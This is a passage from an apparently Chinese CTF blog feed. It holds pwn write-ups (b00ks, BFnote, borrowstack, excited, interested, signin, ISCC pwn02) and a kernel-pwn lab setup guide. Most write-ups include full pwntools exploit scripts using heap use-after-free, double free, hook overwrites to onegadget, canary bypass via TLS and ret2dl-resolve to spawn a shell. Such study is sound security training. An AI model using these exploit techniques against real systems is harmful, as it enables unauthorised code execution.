0x00000000000000000x56260bc1b080: 0x0000000000000000 0x0000000000000000-------------------------------------------------------------------------------------------------pwndbg&gt; x/10gx 0x56260bc1b0400x56260bc1b040: 0x6161616161616161 0x61616161616161610x56260bc1b050: 0x6161616161616161 0x61616161616161610x56260bc1b060: 0x000056260bd2e160 0x00000000000000000x56260bc1b070: 0x0000000000000000 0x00000000000000000x56260bc1b080: 0x0000000000000000 0x0000000000000000 off-by-one 覆盖指针低字节程序提供了一个change 功能，用于修改author name，所以可以通过修改author name 将book1的低字节覆盖为’\x00’，覆盖之后这个指针会指向book1 的 description ，程序同样也提供了edit功能修改description中的内容，所以我们可以在description 中布置数据伪造一个book结构，这个book结构 中的name 和 description 指针均可以直接抑制。 再次调用printf()函数打印将可直接得到book2_name_addr （这里需要注意的是，对于book2需要申请一个非常大的空间，才能使用堆块mmap分配，才能够泄漏libc base addr）在gdb中下断，用得到的book2_name_addr - libcbase 即可得到到libcbase 的偏移，这个偏移是不变的，而且每个人的环境不同偏移也可能不一样，这样就拿到了libcbase了。 因为程序开户了RELOR，got表不可改，但是可以改写__free_hook或__malloc_hook结合前面泄漏的libcbase可以得到onegadget 地址，最后通过修改book1跟book2的description实现任意地址写，将__free_hook内容写入为onegadget，free即可调用onegadget（free时，如果 __free_hook不为空，即执行free_hook） exp: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192#coding:utf-8from pwn import *#内存地址随机化def debug(addr,PIE=True): if PIE: text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[1], 16) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,"b *&#123;&#125;".format(hex(addr))) p = process('./b00ks')elf = ELF('./b00ks')libc = elf.libccontext.log_level = 'debug'def create(name_size,name,des_size,des): p.recvuntil('&gt; ') p.sendline('1') p.recvuntil('size: ') p.sendline(str(name_size)) p.recvuntil('(Max 32 chars): ') p.sendline(name) p.recvuntil('size: ') p.sendline(str(des_size)) p.recvuntil('description: ') # debug(0x10B7,1) p.sendline(des)def printf(): p.recvuntil('&gt; ') # debug(0xd56,1) p.sendline('4')def editbook(book_id,new_des,a): p.recvuntil('&gt; ') p.sendline('3') p.recvuntil(': ') p.writeline(str(book_id)) p.recvuntil(': ') if a: debug(0xf30,1) p.sendline(new_des)def change_author_name(): p.recvuntil('&gt; ') p.sendline('5') p.recvuntil('name: ') debug(0xb99,1) p.sendline('a'*32)def delete(id): p.recvuntil('&gt; ') p.sendline('2') p.recvuntil('Enter the book id you want to delete: ') p.sendline(str(id))p.recvuntil('name: ')p.sendline('a'*32)create(142,'n0va',142,'n0va')create(0x21000,'book2_name2',0x21000,'book2_des')# create(32,'n0va',32,'n0va')printf()# pause()p.recvuntil('a'*32)book1_addr = u64(p.recv(6).ljust(8,'\x00'))book2_addr = book1_addr + 0x30print "book1_addr --&gt; " + hex(book1_addr)print "book2_addr --&gt; " + hex(book2_addr)# book1_addr + 0x38 = book2_name# book1_addr + 0x40 = book2_despayload = 'a'*0x40 + p64(1) + p64(book1_addr+0x38) + p64(book1_addr+0x40) + p64(0xffff)editbook(1,payload,0)change_author_name()printf()p.recvuntil('Name: ')book2_name_addr = u64(p.recv(6).ljust(8,'\x00'))p.recvuntil('Description: ')book2_des_addr = u64(p.recv(6).ljust(8,'\x00'))print "book2_name_addr --&gt; " + hex(book2_name_addr)print "book2_des_addr --&gt; " + hex(book2_des_addr)pause()offset = 0x5ac010 #泄漏出来的地址（即book2_name_addr)跟 libcbase的偏移，不同环境这个值会不同libcbase = book2_name_addr - offsetfree_hook = libc.symbols['__free_hook'] + libcbasesystem = libc.symbols['system'] + libcbaseonegadget = libcbase + 0x4526abinsh_addr = libc.search('/bin/sh').next() + libcbaseprint "free_hook --&gt; " + hex(free_hook)print "system --&gt; " + hex(system)print "binsh_addr --&gt; " + hex(binsh_addr)print "onegadget --&gt; " + hex(onegadget)# pause()payload = p64(free_hook) + p64(free_hook)editbook(1,payload,0)payload = p64(onegadget)editbook(2,payload,0)delete(2)p.interactive()]]></content>
      <categories>
        <category>堆</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[kernel pwn 环境搭建]]></title>
    <url>%2F2020%2F06%2F21%2Fkernel%20pwn%20%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%2F</url>
    <content type="text"><![CDATA[编译生成内核镜像先下载一个内核源码 ：https://mirrors.edge.kernel.org/pub/linux/kernel/我下载的是linux-4.9.tar.gz然后安装一些依赖12sudo apt-get updatesudo apt-get install git fakeroot build-essential ncurses-dev xz-utils libssl-dev bc 解压源码后进入内核目录，输入命令:sudo make menuconfig进入内核编译设置 进入kernel hacking，检查保证勾选了以下选项(其实默认都是勾选的，只是进去看一眼而已) Kernel debugging Compile-time checks and compiler options —&gt; Compile the kernel with debug info和Compile the kernel with frame pointers KGDB: kernel debugger 保存并退出 sudo make bzImage生成 bzImage，过程挺久的，完成后在boot下生成了一个bzImage文件 这样，就算编译成功了这样我们就从/arch/x86/boot得到了 bzImage文件 下载内核镜像根据版本号搜索 sudo apt search linux-image-xxx 然后下载 sudo apt download linux-image-4.10.0-1004-gcp，解压 安装busybox这里下载，解压后进入目录，make menuconfig，同样会进入图形界面，在Settings 上勾选Build static binary (no shared libs),然后保存退出 编译，执行make install，根目录下会生成一个_install文件夹，进入文件夹配置 123456cd _installmkdir procmkdir systouch inittouch packetchmod +x init 编辑init 文件，用于内核初始化 123456789101112131415#!/bin/shecho "&#123;==DBG==&#125; INIT SCRIPT"mkdir /tmpmount -t proc none /procmount -t sysfs none /sysmount -t debugfs none /sys/kernel/debugmount -t tmpfs none /tmp#mount指令 挂载某个分区到某个文件，这样就将分区与文件建立联系从而访问文件时就可以访问分区。# insmod /xxx.ko # 加载模块# insmod /hello.ko # 加载hello.ko模块mdev -s # We need this to find /dev/sda laterecho -e "&#123;==DBG==&#125; Boot took $(cut -d' ' -f1 /proc/uptime) seconds"setsid /bin/cttyhack setuidgid 1000 /bin/sh #normal user# exec /bin/sh #root 几个常见指令 insmod: 指定模块加载到内核中 rmmod: 从内核中卸载指定模块 lsmod: 列出已经加载的模块 在packet 中写入，用于将FileSystem 打包成映像 123#!/bin/shecho "Generate rootfs.img"find . | cpio -o --format=newc &gt; ./rootfs.img 运行 packet 将得到 rootfs.img文件 运行内核这里使用qemu进行运行，qemu 有多种运行模式，常见的有User-mode emulation和System emulation两种 安装 qemu1234安装QEMU的依赖库sudo apt-get install git libglib2.0-dev libfdt-dev libpixman-1-dev zlib1g-devsudo apt-get install qemu测试输入qemu + tab 如果有很多实例回显，就说明安装成功 接着写一个shell脚本boot.sh用来启动qemu，运行内核 123456789101112#!/bin/shqemu-system-x86_64 \-m 64M \-kernel ./bzImage \-initrd ./rootfs.img \-append "root=/dev/ram rw oops=panic panic=1 kalsr" \-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \-monitor /dev/null \-smp cores=2,threads=1 \-cpu kvm64,+smep \#-S 启动gdb调试#-gdb tcp::1234 等待gdb调试 将前面生成的bzImage，rootfs.img一起放到_install文件夹下，运行boot.sh 这里解释一下shell命令中参数的意义 123456789-m 是指定RMA大小(默认384)-kernel 是指定的内核镜像，这里是我们编译的镜像路径，也可以是我们下载好的镜像，如./vmlinuz-4.10.0-1004-gcp-initrd 设置刚刚利用 busybox 创建的 rootfs.img,作为内核启动的文件系统 -append 附加选项，指定no kaslr 可以关闭随机偏移--nographic和console=ttyS0一起使用，启动的界面就变成了当前终端-s 相当于-gdb tcp::1234的简写，可以直接通过主机的gdb远程连接-monitor 配置用户械的网络 // 将监视器重定向主机设备 /dev/null-smp 用于生明所以可能用的cps,ie,socket cores threads = maxcputs.-cpu 设置cpu的安全选项 到这里也说明了为什么kernel pwn 题目一般都会给出这3个文件.sh ,bzImage,rootfs.cpio，分别是启动脚本，kernel镜像以及文件系统映像 一般来说kernel pwn 里面，漏洞通常是出现在ko文件，也就是模块文件，驱动 文件中，而kernel pwn 的最终目标一般是提权，拿到root才能读取flag 添加syscall在内核源码下添加一个目录：mysyscall，在mysyscall文件夹下添加一个mysyscall.c 一个Makefile 1234mkdir mysyscallcd mysyscalltouch mysyscall.ctouch Makefile 编辑Makefile： 1obj-y=mysyscall.o 编辑mysyscall.c 12345#include &lt;linux/kernel.h&gt;asmlinkage long sys_mysyscall(void)&#123; printk("&#123;==== kernel ====&#125;this is my syscall!\n"); return 0;&#125; 接着编辑源码根目录下的Makefile，添加mysyscall/ 然后编辑include/linux/syscall.h，在末尾添加函数原型 1asmlinkage long sys_mysyscall(void); 最后编辑arch/x86/entry/syscalls/syscall_32.tbl和arch/x86/entry/syscalls/syscall_64.tbl,添加系统 调用号 1234//syscall_32.tbl2333 i386 mysyscall sys_mysyscall//syscall_64.tbl2333 common mysyscall sys_mysyscall 到这里，syscall就添加完了，如果调用了2333号就会输出 一句{==== kernel ====}this is my syscall!，不过要重新编译一次内核才能生效，make bzImage重新得到bzImage文件 编译ko在kernel 源码目录下创建一个新的文件夹 1234mkdir test_kocd test_kotouch hello.ctouch Makefile 编辑hello.c 123456789101112131415161718192021//hello.c#include &lt;linux/init.h&gt;#include &lt;linux/module.h&gt;#include &lt;linux/kernel.h&gt;#include &lt;linux/cred.h&gt;MODULE_LICENSE("Dual BSD/GPL");struct cred c1;static int hello_init(void) &#123; printk("================"); printk("&lt;1&gt; Hello world!\n"); printk("size of cred : %d \n",sizeof(c1)); printk("================"); return 0;&#125;static void hello_exit(void) &#123; printk("&lt;1&gt; Bye, cruel world\n");&#125;module_init(hello_init);module_exit(hello_exit); 编辑Makefile，（写Makefile的时候注意要使用Tab而不是空格） 1234567891011121314obj-m := hello.oKERNELDR := ~/linux-4.9PWD := $(shell pwd) modules: $(MAKE) -C $(KERNELDR) M=$(PWD) modules moduels_install: $(MAKE) -C $(KERNELDR) M=$(PWD) modules_install clean: rm -rf *.o *~ core .depend .*.cmd *.ko *.mod.c .tmp_versions 然后make 命令编译出一个hello.ko文件 将编译好的hello.ko放到busybox的_install目录下，再写一个demo来调用前面添加的syscall，将demo也放到_install目录下 1234567//demo //gcc demo.c -static -o demo#include &lt;unistd.h&gt;int main(void)&#123; syscall(2333); return 0;&#125; 注意这里我们需要加载自己编译的驱动 hello.ko，所以需要在init 文件中加入一句insmod /hello.ko然后再打包./packet 接着./boot.sh启动可以看到我们的ko模块和syscall都生效了]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2020年i春秋新春战役之 pwn 题解]]></title>
    <url>%2F2020%2F06%2F21%2Fi%E6%98%A5%E7%A7%8B%E6%96%B0%E6%98%A5%E6%88%98%E5%BD%B9%2F</url>
    <content type="text"><![CDATA[2-21 – BFnote这题很秀，我觉得有必要记录下来 简单分析一下程序不难发现程序存在很明显的栈溢出，但是因为开启了canary，得想办法绕过；还有在malloc(size)的时候，size大小不限 不仔细看还发现不了，下方还存在一个下标溢出，v4一开始被初始化后，在循环中只有i被重新赋值，而v4在后面又用到了 这道题就只有这两个漏洞点 1234567891011121314151617181920212223sub_80486F7();fwrite("\nGive your description : ", 1u, 0x19u, stdout);memset(&amp;s, 0, 0x32u);my_read(0, &amp;s, 0x600); // 栈溢出fwrite("Give your postscript : ", 1u, 0x17u, stdout);memset(&amp;unk_804A060, 0, 0x64u);my_read(0, &amp;unk_804A060, 0x600);fwrite("\nGive your notebook size : ", 1u, 0x1Bu, stdout);size = read_int();v3 = (char *)malloc(size);memset(v3, 0, size);fwrite("Give your title size : ", 1u, 0x17u, stdout);v4 = read_int();for ( i = v4; size - 0x20 &lt; i; i = read_int() )// 这里只更新了i，v4并没有变而在后面又用到了v4 fwrite("invalid ! please re-enter :\n", 1u, 0x1Cu, stdout);fwrite("\nGive your title : ", 1u, 0x13u, stdout);my_read(0, v3, i);fwrite("Give your note : ", 1u, 0x11u, stdout);read(0, &amp;v3[v4 + 0x10], size - v4 - 16); // 这里存在下标溢出fwrite("\nnow , check your notebook :\n", 1u, 0x1Du, stdout);fprintf(stdout, "title : %s", v3);fprintf(stdout, "note : %s", &amp;v3[v4 + 0x10]);return __readgsdword(0x14u) ^ v6; 思路对于这个canary的绕过，需要用到TLS，不过需要用到malloc(size)大小不限这个地方 canary 这个值是怎么来的呢，在linux 下，有一种线程局部存储(Thread Local Storage)机制，简称为TLS。它主要存储着一个线程的一些局部变量，它的结构体如下 12345678910111213typedef struct &#123; void *tcb; /* Pointer to the TCB. Not necessarily the thread descriptor used by libpthread. */ dtv_t *dtv; void *self; /* Pointer to the thread descriptor. */ int multiple_threads; int gscope_flag; uintptr_t sysinfo; uintptr_t stack_guard; uintptr_t pointer_guard; ... &#125; tcbhead_t; 在汇编中： 1mov eax, large gs:14h 而gs寄存器就指向这个结构体，结构体里的stack_guard值就是canary 的值，所以只要能篡改结构体里stack_guard的值就可以绕过canary了 一、需要确定这个结构体在内存中的位置，在gdb中，search -t dword (canary)可以搜索到canary 的地址 二、如何修改这个值，上面提到了malloc(size)中对size的大小没有限制，所以可以malloc一个很大的size，这样系统就会调用mmap来分配内存(size &gt;= 0x20000) ，再结合v4的下标溢出，可以精确地修改canary的值 三、栈溢出后的事，再看一下这个程序中用到的输出函数你会发现，用的都是fwrite，fprintf，这样我们很验证找到合适的gadget来控制参数来link地址，所以最后还是决定用dl-runtime-resolve来执行system(“/bin/sh”) exp: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374#-*-coding:utf-8-*-from pwn import *# from roputils import *context.log_level = 'debug'context.terminal = ['gnome-terminal','-x','bash','-c']context(arch='amd64', os='linux')p = process('./BFnote')elf = ELF('./BFnote')sd = lambda s:p.send(s)sl = lambda s:p.sendline(s)rc = lambda s:p.recv(s)ru = lambda s:p.recvuntil(s)sda = lambda a,s:p.sendafter(a,s)sla = lambda a,s:p.sendlineafter(a,s)bss_stage1 = elf.bss() + 0x300bss_stage2 = 80 + bss_stage1ppp = 0x080489d9pop_ebp = 0x080489dbleave_ret = 0x08048578pay = 'a'*0x3a + p32(0x804A064)# gdb.attach(p,"b *0x8048965")sda("description :",pay)buf = p32(elf.plt['read']) + p32(ppp)buf += p32(0) + p32(bss_stage1) + p32(100)buf += p32(pop_ebp) + p32(bss_stage1)buf += p32(leave_ret)sla("postscript :",buf)sla("size :",str(0x20000))sla("size :",str(0x216fc))sla("re-enter :\n",str(4))sda("title :",'a'*4)sda("note :",'a'*4)pause()cmd = '/bin/sh'plt_0 = 0x8048450rel_plt = 0x80483d0 #elf.get_section_by_name('.rel.plt').header.sh_addrindex_offset = (bss_stage1+28) - rel_pltread_got = elf.got['read']dynsym = 0x80481d8 #objdump -s -j .dynsym bofdynstr = 0x80482c8 #objdump -s -j .dynstr boffake_sym_addr = bss_stage1+36align = 0x10 -((fake_sym_addr - dynsym) &amp; 0xf)fake_sym_addr = fake_sym_addr + alignindex_dynsym = (fake_sym_addr - dynsym) / 0x10r_info = (index_dynsym&lt;&lt;8) | 0x7fack_reloc = p32(read_got) + p32(r_info)st_name = (fake_sym_addr + 0x10) - dynstrst_name = (fake_sym_addr + 0x10) - dynstr #加0x10是因为Elf32_Sym的大小为0x10fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)payload = 'aaaa'payload += p32(plt_0)payload += p32(index_offset)payload += 'aaaa'payload += p32(bss_stage2)payload += 'aaaaaaaa'payload += fack_reloc #(bss_stage1+28)的位置payload += 'b'*alignpayload += fake_sym #(bss_stage1+36)的位置 payload += "system\x00"payload += 'a'*(80-len(payload))payload += cmd + '\x00'payload += 'a'*(100-len(payload))sl(payload)p.interactive() 2-22 – borrowstack12345Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) 没有开canary，且溢出0x10字节，只能覆盖rbp和写一条gadget，后面还有往bss段写入数据 ，很明显是栈迁移了，但是我在最后执行system(“/bin/sh”)却一直报错，最后用的onegadget才成功，不过听说迁移两次就可以了 exp: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758#coding:utf-8from pwn import *local = 1if local: context.log_level = 'debug' p = process('./borrowstack') elf = ELF('./borrowstack') libc = elf.libcelse: p = remote("") # elf = ELF('./')sd = lambda s:p.send(s)sl = lambda s:p.sendline(s)rc = lambda s:p.recv(s)ru = lambda s:p.recvuntil(s)sda = lambda a,s:p.sendafter(a,s)sla = lambda a,s:p.sendlineafter(a,s)one = [0x45216,0x4526a,0xf02a4,0xf1147]pop_rdi = 0x0000000000400703pop_rsi_r15 = 0x0000000000400701leave_ret = 0x0000000000400699bank = 0x601080main = 0x400656mov = 0x4006E0ppp = 0x4006FAread_got = 0x601028pay = 0x60*'a' + p64(bank + 0x20) + p64(leave_ret)# gdb.attach(p,"b *0x40069A")sda("want\n",pay)pay = p64(bank + 0x28)*5 + p64(pop_rdi) + p64(0)pay += p64(pop_rdi) + p64(elf.got['puts'])pay += p64(elf.plt['puts'])pay += p64(pop_rdi) + p64(0)pay += p64(pop_rsi_r15) + p64(0x601100) + p64(0)pay += p64(elf.plt['read'])sda("now!\n",pay)puts_addr = u64(ru('\n').strip('\n').ljust(8,'\x00'))libc_base = puts_addr - libc.symbols['puts']onegadget = libc_base + one[1]system = libc_base + libc.symbols['system']binsh = libc_base + libc.search("/bin/sh\x00").next()pop_rdx = libc_base + 0x1b92add_rsp_8 = libc_base + 0x35132log.info("puts_addr --&gt; %s",hex(puts_addr))pay = p64(pop_rdi) + p64(binsh)pay += p64(pop_rsi_r15) + p64(0)*2pay += p64(pop_rdx) + p64(0)pay += p64(system)sl(p64(onegadget))p.interactive() 2-22 – excited1234567891011if ( v1 &lt; 0 || v1 &gt; 10 || !ptr[v1] )&#123; puts("Emmmmmm!Maybe you want Fool me!"); sub_4009C1();&#125;free(*(void **)ptr[v1]);free(*((void **)ptr[v1] + 1));free(ptr[v1]);puts("#---------------------#");puts("# ALL Down! #");puts("#######################"); delete功能中存在uaf，而且程序一开始就把flag读进来了 123456789101112131415161718unsigned __int64 sub_400896()&#123; FILE *stream; // [rsp+0h] [rbp-10h] unsigned __int64 v2; // [rsp+8h] [rbp-8h] v2 = __readfsqword(0x28u); setbuf(stdin, 0LL); setbuf(stdout, 0LL); stream = fopen("/flag", "r"); if ( !stream ) &#123; puts("Emmmmmm!Maybe you want Fool me!"); exit(0); &#125; byte_6020A0 = 96; fgets(s, 45, stream); return __readfsqword(0x28u) ^ v2;&#125; 所以只需要构造double free，然后把0x6020a8插进去之后 show 就行了 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#coding:utf-8from pwn import *local = 0if local: context.log_level = 'debug' p = process('./excited') elf = ELF('./excited') libc = elf.libcelse: p = remote("123.56.85.29","6484") # elf = ELF('./')#内存地址随机化def debug(addr=0,PIE=True): if PIE: text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[1], 16) print "breakpoint_addr --&gt; " + hex(text_base + 0x202040) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,"b *&#123;&#125;".format(hex(addr))) sd = lambda s:p.send(s)sl = lambda s:p.sendline(s)rc = lambda s:p.recv(s)ru = lambda s:p.recvuntil(s)sda = lambda a,s:p.sendafter(a,s)sla = lambda a,s:p.sendlineafter(a,s)one = [0x45216,0x4526a,0xf02a4,0xf1147]def create(ba_len,ba,na_len,na): sla("do :",'1') sla("length : ",str(ba_len)) sda("ba : ",ba) sla("length : ",str(na_len)) sda("na : ",na)def delete(idx): sla("do :",'3') sla("ID : ",str(idx))def show(idx): sla("do :",'4') sla("ID : ",str(idx))create(0x28,'0-b',0x28,'0-n') #0create(0x28,p64(0)*3 + p64(0x31),0x18,'1-n')#1delete(0)delete(1)delete(1)create(0x28,'2',0x28,'2')create(0x18,p64(0x6020A8),0x18,p64(0x6020A8))show(1)# debug()p.interactive() interested同样的free完没清空指针，但是堆块的大小被限定在fastbin范围 思路，先通过UAF link堆地址，再伪造堆的大小，free后进入unsotredbin link出main_arena，最后UAF到malloc_hook-0x23覆写malloc_hook为onegadget exp: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485#coding:utf-8from pwn import *local = 1if local: context.log_level = 'debug' p = process('./interested') elf = ELF('./interested') libc = elf.libcelse: p = remote("") # elf = ELF('./')#内存地址随机化def debug(addr=0,PIE=True): if PIE: text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[1], 16) print "breakpoint_addr --&gt; " + hex(text_base + 0x202050) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,"b *&#123;&#125;".format(hex(addr))) sd = lambda s:p.send(s)sl = lambda s:p.sendline(s)rc = lambda s:p.recv(s)ru = lambda s:p.recvuntil(s)sda = lambda a,s:p.sendafter(a,s)sla = lambda a,s:p.sendlineafter(a,s)one = [0x45216,0x4526a,0xf02a4,0xf1147]def check_code(): sla("to do :",'0') #这里有格式化字符串漏洞 ,然而并用不着def create(Olen,O,RElen,RE): sla("to do :",'1') sla("length : ",str(Olen)) sda("O : ",O) sla("length : ",str(RElen)) sda("RE : ",RE)def edit(idx,O,RE): sla("to do :",'2') sla("ID : ",str(idx)) sda("O : ",O) sda("RE : ",RE)def delete(idx): sla("to do :",'3') sla("ID : ",str(idx))def show(idx): sla("to do :",'4') sla("ID : ",str(idx))sla("please:","OreOOrereOOreO")create(0x68,p64(0) + p64(0x71) ,0x68,p64(0) + p64(0x61))create(0x68,'b',0x68,'b')delete(2)show(2)ru("RE is ")heap = u64(ru('\n').strip('\n').ljust(8,'\x00')) - 0xe0log.info("heap --&gt; %s",hex(heap))edit(2,p64(0),p64(heap + 0x10))create(0x68,'c',0x68,'c') #3edit(1,p64(0) + p64(0xd1),p64(0))delete(3)show(3)ru("RE is ")main_arena = u64(ru('\n').strip('\n').ljust(8,'\x00')) - 88malloc_hook = main_arena - 0x10fack_chunk = malloc_hook - 0x23libc_base = malloc_hook - libc.symbols['__malloc_hook']onegadget = libc_base + one[3]log.info("main_arena --&gt; %s",hex(main_arena))delete(2)create(0x68,p64(fack_chunk),0x68,'d')create(0x68,'e',0x68,'e'*0x13 + p64(onegadget))sla("to do :",'1')sla("length : ",str(32))# debug()p.interactive() 2-23 – signinglibc 版本2.29，add,del,edit三个功能，还有一个backdoor add : addcnt = 7，所以可以申请8个大小的0x80的堆块 12345678910111213141516171819202122unsigned __int64 add()&#123; unsigned int v1; // [rsp+Ch] [rbp-24h] __int64 s; // [rsp+10h] [rbp-20h] __int64 v3; // [rsp+18h] [rbp-18h] unsigned __int64 v4; // [rsp+28h] [rbp-8h] v4 = __readfsqword(0x28u); puts("idx?"); s = 0LL; v3 = 0LL; memset(&amp;s, 0, 0x10uLL); read(0, &amp;s, 0xFuLL); v1 = atoi((const char *)&amp;s); if ( addcnt &gt;= 0 &amp;&amp; v1 &lt;= 0xF ) &#123; ptrlist[v1] = malloc(0x70uLL); flags[v1] = 1; --addcnt; &#125; return __readfsqword(0x28u) ^ v4;&#125; del，free后指针未清空，UAF 123456789101112131415161718192021unsigned __int64 del()&#123; unsigned int v1; // [rsp+Ch] [rbp-24h] __int64 s; // [rsp+10h] [rbp-20h] __int64 v3; // [rsp+18h] [rbp-18h] unsigned __int64 v4; // [rsp+28h] [rbp-8h] v4 = __readfsqword(0x28u); puts("idx?"); s = 0LL; v3 = 0LL; memset(&amp;s, 0, 0x10uLL); read(0, &amp;s, 0xFuLL); v1 = atoi((const char *)&amp;s); if ( v1 &lt;= 0xF &amp;&amp; flags[v1] == 1 ) &#123; free(ptrlist[v1]); flags[v1] = 0; &#125; return __readfsqword(0x28u) ^ v4;&#125; edit : cnt=0，所以该功能只能用一次 123456789101112131415161718192021unsigned __int64 edit()&#123; unsigned int v0; // ST0C_4 __int64 s; // [rsp+10h] [rbp-20h] __int64 v3; // [rsp+18h] [rbp-18h] unsigned __int64 v4; // [rsp+28h] [rbp-8h] v4 = __readfsqword(0x28u); if ( cnt &gt;= 0 ) &#123; puts("idx?"); s = 0LL; v3 = 0LL; memset(&amp;s, 0, 0x10uLL); read(0, &amp;s, 0xFuLL); v0 = atoi((const char *)&amp;s); read(0, ptrlist[v0], 0x50uLL); --cnt; &#125; return __readfsqword(0x28u) ^ v4;&#125; backdoor : 在判断ptr前调用了calloc(1,0x70)，这是关键 1234567void __noreturn backdoor()&#123; calloc(1uLL, 0x70uLL); if ( ptr ) system("/bin/sh"); exit(0);&#125; 先明确几个问题，calloc虽然跟malloc相似，但是它是不会使用tecache bin 的，所以应该考虑fastbin attack，而且 _int_malloc中，从fastbin bin取下一块后，如果fastbin还有剩余，而且对应的teache 没满的话，就把它放到对应大小的teache 所以如果伪造了fastbin bin，我们就可以往chunk+0x18处写入teache 这时候把teache的一块申请出来再调用calloc，就满足fastbin还剩余，teache未满，调用teache_put exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960#coding:utf-8from pwn import *local = 1if local: context.log_level = 'debug' p = process('./signin') # elf = ELF('./') # libc = elf.libcelse: p = remote("") # elf = ELF('./')#内存地址随机化def debug(addr=0,PIE=True): if PIE: text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[1], 16) print "breakpoint_addr --&gt; " + hex(text_base + 0x202040) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,"b *&#123;&#125;".format(hex(addr))) sd = lambda s:p.send(s)sl = lambda s:p.sendline(s)rc = lambda s:p.recv(s)ru = lambda s:p.recvuntil(s)sda = lambda a,s:p.sendafter(a,s)sla = lambda a,s:p.sendlineafter(a,s)def add(idx): sla("choice?",'1') sla("idx?\n",str(idx))def edit(idx,message): sla("choice?",'2') sla("idx?\n",str(idx)) sleep(0.1) pause() sd(message)def delete(idx): sla("choice?",'3') sla("idx?\n",str(idx))def backdoor(): sla("choice?",'6')for i in range(8): add(i)for i in range(8): delete(i)# gdb.attach(p,"b *0x40136E")edit(7,p64(0x4040C0-0x18))add(1)gdb.attach(p,"b *0x40148F")backdoor()# debug()p.interactive()]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ISCC的pwn02]]></title>
    <url>%2F2020%2F06%2F21%2FISCC%E7%9A%84pwn02%2F</url>
    <content type="text"><![CDATA[12345Arch: amd64-64-little RELRO: No RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) 保护只开启了NX，程序有3个功能： 1231、malloc + get2、free3、puts ) 程序漏洞主要在free这里，释放空间后对应的指针没有清空，于是便存在Use After Free漏洞 做法一：onegadget利用思路：利用uaf泄漏出真实地址，doouble free构造假chunk覆盖 malloc_hook 为onegadget 1、首先，申请一个unsort bins 范围大小的空间，然后释放，此时这块chunk的fd,bk就会指向main_arena+88，puts打印出来-88-0x10就得到了mallo_hook的真实地址 2、接下来要构造假的chunk ，需要先double free 一下，再利用uaf将fack_chunk 链到fasbins上，但是在malloc申请空间时会有一个检测：检测size of chunk 是否是fastbin范围内，所以需要找到一处值为0x00~0x80的位置， 在malloc_hook-0x23处，便存在这样的数据,基为0x7f，所以我们要申请0x70大小的空间。 12345pwndbg&gt; hexdump 0x7f7245e21b10-0x23+0000 0x7f7245e21aed 00 00 00 60 02 e2 45 72 7f 00 00 00 00 00 00 00 │...`│..Er│....│....│+0010 0x7f7245e21afd 00 00 00 20 2e ae 45 72 7f 00 00 00 2a ae 45 72 │....│..Er│....│*.Er│+0020 0x7f7245e21b0d 7f 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 │....│....│....│....│+0030 0x7f7245e21b1d 00 00 00 00 00 00 00 01 00 00 00 00 00 00 00 00 │....│....│....│....│ 3、空间申请成功后，将malloc_hook覆盖为onegadget 地址再调用一次gets函数getshell 做法二：system(‘/bin/sh’)因为远程对/bin/sh替换成了catflag，onegadget并不能getshell （我也母鸡为什么不行），那断然不行，就只能换一种做法了，程序中还存在sh函数 所以思路就变成，将malloc_hook覆盖成sh地址，并且传入参数a1 = ‘/bin/sh’，a1就是malloc(size)的size 所以只需要将size设为指向字符串’/bin/sh’的地址就行了，那么问题又来了，这个指针无疑就是堆指针，所以要先泄漏堆地址：double free再puts就行了 exp: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061#coding:utf-8from pwn import *p = process('./pwn02')# p = remote("39.100.87.24","8102")elf = ELF('./pwn02')libc = elf.libccontext.log_level = 'debug'def gets(i,size,s): p.recvuntil('&gt; ') p.sendline('1 ' + str(i)) p.sendline(str(size) +'\n' + s)def free(i): p.recvuntil('&gt; ') p.sendline('2 ' + str(i))def puts(i): p.recvuntil('&gt; ') p.sendline('3 ' + str(i))# 泄漏malloc_hook(main_arena+88-88-0x10)gets(0,0x300,'n0va_1')gets(1,0,'n0va_2')free(0)puts(0)# (main_arena+88)-88-0x10malloc_hook = u64(p.recv(6).ljust(8,'\x00')) - 88 - 0x10print "malloc_hook --&gt; " + hex(malloc_hook)offset = malloc_hook - libc.symbols['__malloc_hook']onegadget = offset + 0x4526a #0xf02a4 - 0xf1147print "onegadget --&gt; " + hex(onegadget)fack_chunk = malloc_hook - 0x23print "fack_chunk --&gt; " + hex(fack_chunk)# gdb.attach(p,"b *0x4008F4")# 泄漏堆指针 gets(0,0,'n0va_0')gets(0,1,'n0va_1')free(0)free(1)free(0)puts(0)heap = 